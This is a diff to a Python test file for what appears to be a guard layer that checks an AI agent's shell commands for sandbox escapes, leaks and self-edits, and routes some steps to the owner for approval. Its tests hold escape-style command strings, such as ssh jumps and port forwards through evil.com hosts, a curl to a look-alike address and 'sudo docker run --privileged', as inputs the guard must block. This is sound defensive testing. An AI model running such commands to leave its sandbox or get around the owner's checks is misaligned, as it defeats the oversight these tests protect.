@@ -180,7 +180,7 @@ def test_copies_finds_each_kind_of_private_piece():
     assert facts.copies(p, ["pizza near me"]) == []
 
 
-async def test_the_private_corpus_holds_her_notes_and_classed_results_not_public_ones(store):
+async def test_the_private_corpus_holds_its_notes_and_classed_results_not_public_ones(store):
     cid = await conversations.create(store)
     mid = "m1"
     def fn(c):
@@ -257,7 +257,7 @@ async def test_escape_needs_a_hard_fact(store):
     assert not ask.seen
 
 
-def test_her_devices_are_no_escape_the_rest_of_the_lan_is():
+def test_the_agents_devices_are_no_escape_the_rest_of_the_lan_is():
     from celine import devices
     from celine.guard import facts
     own = devices._hosts(["http://192.168.1.30:4096", "", "mac.local:8765"])
@@ -270,10 +270,10 @@ def test_her_devices_are_no_escape_the_rest_of_the_lan_is():
         assert esc(cmd) is None, cmd
     assert esc("ssh 10.20.30.40") == "the command has ssh 1"
     assert esc("ssh -J 192.168.1.30 10.20.30.40 ls") is not None
-    # her address inside a longer name is not hers
+    # its address inside a longer name is not its own
     assert esc("curl http://192.168.1.30.evil.com/x") is not None
     assert esc("ssh mac.local.evil.com") is not None
-    # through her device to elsewhere: every host it names must be hers
+    # through its device to elsewhere: every host it names must be its own
     for cmd in ("ssh -L 8080:db.lan:80 mac.local", "ssh -L8080:db.lan:80 mac.local",
                 "ssh -Jevil.com mac.local", "ssh -vJ evil.com mac.local",
                 "ssh -o ProxyJump=evil.com mac.local", "ssh -o 'ProxyJump evil.com' mac.local",
@@ -293,7 +293,7 @@ async def test_escape_freezes_and_damage_stops_on_a_held_yes(store):
     v = await guard.check(TURN, _shell("sudo docker run --privileged x"), [], mode="on",
                           judge=_never, store=store, ask=FakeAsk(0.8), cfg=cfg)
     assert v.decision == "stop" and v.rule == "escape" and v.freeze == (
-        "it looks like a way out of her box or around a limit (the command has docker "
+        "it looks like a way out of the shellbox or around a limit (the command has docker "
         "run --privileged), on a command. It looks wrong.")
     [row] = await decisions.listing(store, rule="escape")
     assert row["froze"] and row["piece"] == "the command has docker run --privileged"
@@ -425,7 +425,9 @@ async def test_confirm_asks_the_owner_and_his_answer_decides(store):
             await changed.wait()
             changed = anyio.Event()
             [ask] = approvals.view()
-            assert ask["kind"] == "gate" and ask["action"] == "run notebook__write"
+            assert ask["kind"] == "gate" and ask["title"].endswith(" asks to run notebook__write.")
+            assert ask["detail"]["title"] == "Arguments" and \
+                json.loads(ask["detail"]["text"]) == {"path": "a.md", "text": "x"}
             assert approvals.decide(ask["id"], ok, OWNER)
         got = out["r"]
         assert got == want if ok else got[1].content == want
@@ -433,9 +435,9 @@ async def test_confirm_asks_the_owner_and_his_answer_decides(store):
         ["denied", "approved"]
 
 
-async def test_a_fresh_install_confirms_the_steps_that_reach_out_or_change_her(store):
-    """The seed of the confirm list: a public share and an edit of herself wait for the
-    owner; a private share, a sub-agent and the coding agent on her own machines do
+async def test_a_fresh_install_confirms_the_steps_that_reach_out_or_change_the_agent(store):
+    """The seed of the confirm list: a public share and an edit of the agent wait for the
+    owner; a private share, a sub-agent and the coding agent on its own machines do
     not. The owner's own list replaces the seed."""
     cfg = _cfg()
     assert rules.current(cfg)["confirm"]["tools"] == ["shell__share:public", "me__edit"]
@@ -464,7 +466,7 @@ async def test_a_fresh_install_confirms_the_steps_that_reach_out_or_change_her(s
 
 # ---- passes ------------------------------------------------------------------------------
 
-async def test_a_pass_holds_until_its_time_and_her_next_result_hears_of_it_once(store):
+async def test_a_pass_holds_until_its_time_and_its_next_result_hears_of_it_once(store):
     p = await passes.make(store, by=OWNER, rule="leak", minutes=30, conversation_id="c1", at=AT,
                           why="they said it is fine")
     assert p["until"] == "2026-10-22T10:30:00.000+00:00"
@@ -583,13 +585,11 @@ async def test_the_routes_freeze_and_answer_and_a_token_is_refused(store):
         assert (await c.get("/api/guard/freeze")).json()["frozen"]["id"] == r["frozen"]["id"]
         assert (await c.delete("/api/guard/freeze")).json()["unfrozen"]["id"] == \
             r["frozen"]["id"]
-        assert (await c.get("/api/approvals")).json() == {"approvals": [], "count": 0}
         assert (await c.post("/api/approvals/x/answer", json={"ok": True})).status_code == 404
         app.state.auth = SimpleNamespace()            # passkeys on, no session: a token
         for method, path, body in (("post", "/api/guard/freeze", {"why": "x"}),
                                    ("delete", "/api/guard/freeze", None),
                                    ("get", "/api/guard/freeze", None),
-                                   ("get", "/api/approvals", None),
                                    ("post", "/api/approvals/x/answer", {"ok": True})):
             kw = {"json": body} if body is not None else {}
             r = await getattr(c, method)(path, **kw)
@@ -715,7 +715,7 @@ async def test_the_small_role_holds_each_yes_to_a_quote_from_the_call():
         turn_priority, turn_clock = {}, {}
 
         def bind(self, backend, **kw):
-            assert kw["role"] == "small" and kw["body"]["response_format"]
+            assert kw["role"] == "guard" and "response_format" not in kw["body"]
 
             class Bound:
                 answered = SimpleNamespace(model="small-model")
